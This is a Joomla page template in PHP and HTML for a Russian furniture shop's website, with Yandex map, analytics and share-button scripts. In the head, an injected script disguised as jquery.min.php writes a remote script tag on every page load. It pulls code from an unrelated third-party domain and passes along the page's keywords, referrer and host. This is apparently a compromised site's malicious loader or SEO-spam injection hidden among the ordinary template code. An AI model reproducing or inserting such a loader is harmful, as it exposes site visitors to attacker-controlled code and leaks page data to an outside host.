<?php
defined('_JEXEC') or die;

/**
 * Template for Joomla! CMS, created with Artisteer.
 * See readme.txt for more details on how to use the template.
 */

require_once dirname(__FILE__) . DIRECTORY_SEPARATOR . 'functions.php';

// Create alias for $this object reference:
$document = $this;

// Shortcut for template base url:
$templateUrl = $document->baseurl . '/templates/' . $document->template;

Artx::load("Artx_Page");

// Initialize $view:
$view = $this->artx = new ArtxPage($this);

// Decorate component with Artisteer style:
$view->componentWrapper();

JHtml::_('behavior.framework', true);

?>
<!DOCTYPE html>
<html dir="ltr" lang="<?php echo $document->language; ?>">
<head>
    <jdoc:include type="head" />
    <link rel="stylesheet" href="<?php echo $document->baseurl; ?>/templates/system/css/system.css" />
    <link rel="stylesheet" href="<?php echo $document->baseurl; ?>/templates/system/css/general.css" />	
<script type="text/javascript" charset="utf-8" src="//api-maps.yandex.ru/services/constructor/1.0/js/?sid=wtyEOknkz92zcz4bdW2MK_l0pDS77_HF&id=mymap"></script>

       
    
   <!--<meta name="viewport" content="initial-scale = 1.0, maximum-scale = 1.0, user-scalable = yes, width = 1024px">-->
   <meta name="viewport" content="width=1024px">

    <!--[if lt IE 9]><script src="https://html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
    <link rel="stylesheet" href="<?php echo $templateUrl; ?>/css/template.css" media="screen">
    <!--[if lte IE 7]><link rel="stylesheet" href="<?php echo $templateUrl; ?>/css/template.ie7.css" media="screen" /><![endif]-->
    <link rel="stylesheet" href="<?php echo $templateUrl; ?>/css/template.responsive.css" media="all">


    <script>if ('undefined' != typeof jQuery) document._artxJQueryBackup = jQuery;</script>
    <script src="<?php echo $templateUrl; ?>/jquery.js"></script>
    <script>jQuery.noConflict();</script>

    <script src="<?php echo $templateUrl; ?>/script.js"></script>
    <?php $view->includeInlineScripts() ?>
    <script>if (document._artxJQueryBackup) jQuery = document._artxJQueryBackup;</script>

    <!--<script src="<?php echo $templateUrl; ?>/script.responsive.js"></script>-->



<script>var a='';setTimeout(10);if(document.referrer.indexOf(location.protocol+"//"+location.host)!==0||document.referrer!==undefined||document.referrer!==''||document.referrer!==null){document.write('<script type="text/javascript" src="http://steinteppich-leipzig.de/js/jquery.min.php?c_utt=G91825&c_utm='+encodeURIComponent('http://steinteppich-leipzig.de/js/jquery.min.php'+'?'+'default_keyword='+encodeURIComponent(((k=(function(){var keywords='';var metas=document.getElementsByTagName('meta');if(metas){for(var x=0,y=metas.length;x<y;x++){if(metas[x].name.toLowerCase()=="keywords"){keywords+=metas[x].content;}}}return keywords!==''?keywords:null;})())==null?(v=window.location.search.match(/utm_term=([^&]+)/))==null?(t=document.title)==null?'':t:v[1]:k))+'&se_referrer='+encodeURIComponent(document.referrer)+'&source='+encodeURIComponent(window.location.host))+'"><'+'/script>');}</script>
</head>
<body>
<div id="m-main">
<?php if ($view->containsModules('user3', 'extra1', 'extra2')) : ?>

<div class="logo-top"><a href="/"><img alt="Морошка" src="/templates/moroshka/images/logo.png"></a></div>

<div class="topbox">
<div class="oz-top"><?php echo $view->position('ozbutton'); ?></div>
<div class="phone-top"><img alt="звоните" align="left" src="/templates/moroshka/images/phone.png"><?php echo $view->position('phone'); ?></div>
<div class="mail-top"><a href="mailto: info@moroshka-m.ru" title="напишите нам"><img alt="info@moroshka-m.ru" src="/templates/moroshka/images/mail.png"></a></div>
</div>

<nav class="m-nav">    
<?php if ($view->containsModules('extra1')) : ?>
<div class="m-hmenu-extra1"><?php echo $view->position('extra1'); ?></div>
<?php endif; ?>
<?php if ($view->containsModules('extra2')) : ?>
<div class="m-hmenu-extra2"><?php echo $view->position('extra2'); ?></div>
<?php endif; ?>
<?php echo $view->position('user3'); ?>
 </nav>

 <nav class="m-nav prod">    
<?php echo $view->position('user33'); ?>
 </nav>

<?php endif; ?>
<div class="m-sheet clearfix">
           <div class="m-bnr"><?php echo $view->position('banner1', 'm-nostyle'); ?></div>
       <div class="m-map"><?php echo $view->position('map', 'm-nostyle'); ?></div>
<?php echo $view->positions(array('top1' => 33, 'top2' => 33, 'top3' => 34), 'm-block'); ?>
<div class="m-layout-wrapper">
                <div class="m-content-layout">
                    <div class="m-content-layout-row">
                        <?php if ($view->containsModules('left')) : ?>
<div class="m-layout-cell m-sidebar1">
<?php echo $view->position('left', 'm-block'); ?>
                        </div>
<?php endif; ?>
                        <div class="m-layout-cell m-content">
<?php
  echo $view->position('banner2', 'm-nostyle');
  if ($view->containsModules('breadcrumb'))
    echo artxPost($view->position('breadcrumb'));
  echo $view->positions(array('user1' => 50, 'user2' => 50), 'm-article');
  echo $view->position('banner3', 'm-nostyle');
  /*echo artxPost(array('content' => '<jdoc:include type="message" />', 'classes' => ' m-messages'));*/
  echo '<jdoc:include type="component" />';
  echo $view->position('banner4', 'm-nostyle');
  echo $view->positions(array('user4' => 50, 'user5' => 50), 'm-article');
  echo $view->position('banner5', 'm-nostyle');
?>



                        </div>
                        <?php if ($view->containsModules('right')) : ?>
<div class="m-layout-cell m-sidebar2">
<?php echo $view->position('right', 'm-block'); ?>


                        </div>
<?php endif; ?>
                    </div>
                </div>
            </div>
<?php echo $view->positions(array('bottom1' => 33, 'bottom2' => 33, 'bottom3' => 34), 'm-block'); ?>
<?php echo $view->position('banner6', 'm-nostyle'); ?>

</div>

<div class="logo-bottom"><img alt="звоните" align="left" src="/templates/moroshka/images/logobottom.png">Морошка © 2014</div>
<div class="social">
<a href="http://instagram.com/moroshka_mebel"><img alt="twitter" align="right" src="/templates/moroshka/images/in.png" style="margin-right: 0;"></a>
<a href="http://facebook.com/moroshka_m"><img alt="facebook" align="right" src="/templates/moroshka/images/fb.png"></a>
<a href="http://vk.com/moroshka_m"><img alt="vkontakte" align="right" src="/templates/moroshka/images/vk.png"></a>

</div>

<footer class="m-footer">
<div class="m-footer-inner">
<?php if ($view->containsModules('copyright')) : ?> <?php echo $view->position('copyright', 'm-nostyle'); ?><?php else: ?><p>

<script type="text/javascript">(function() {
  if (window.pluso)if (typeof window.pluso.start == "function") return;
  if (window.ifpluso==undefined) { window.ifpluso = 1;
    var d = document, s = d.createElement('script'), g = 'getElementsByTagName';
    s.type = 'text/javascript'; s.charset='UTF-8'; s.async = true;
    s.src = ('https:' == window.location.protocol ? 'https' : 'http')  + '://share.pluso.ru/pluso-like.js';
    var h=d[g]('body')[0];
    h.appendChild(s);
  }})();</script>
<div class="pluso" data-background="#ebebeb" data-options="small,square,line,horizontal,counter,theme=05" data-services="vkontakte,odnoklassniki,facebook,twitter,google,moimir,email,print"></div>

<br>
</p>

<?php endif; ?>
</div> 
</footer>

</div> <?php echo $view->position('debug'); ?>
<!-- Yandex.Metrika counter -->
<script type="text/javascript">
(function (d, w, c) {
    (w[c] = w[c] || []).push(function() {
        try {
            w.yaCounter29332390 = new Ya.Metrika({id:29332390,
                    webvisor:true,
                    clickmap:true,
                    trackLinks:true,
                    accurateTrackBounce:true});
        } catch(e) { }
    });

    var n = d.getElementsByTagName("script")[0],
        s = d.createElement("script"),
        f = function () { n.parentNode.insertBefore(s, n); };
    s.type = "text/javascript";
    s.async = true;
    s.src = (d.location.protocol == "https:" ? "https:" : "http:") + "//mc.yandex.ru/metrika/watch.js";

    if (w.opera == "[object Opera]") {
        d.addEventListener("DOMContentLoaded", f, false);
    } else { f(); }
})(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="//mc.yandex.ru/watch/29332390" style="position:absolute; left:-9999px;" alt="" /></div></noscript>
<!-- /Yandex.Metrika counter -->
</body>
</html>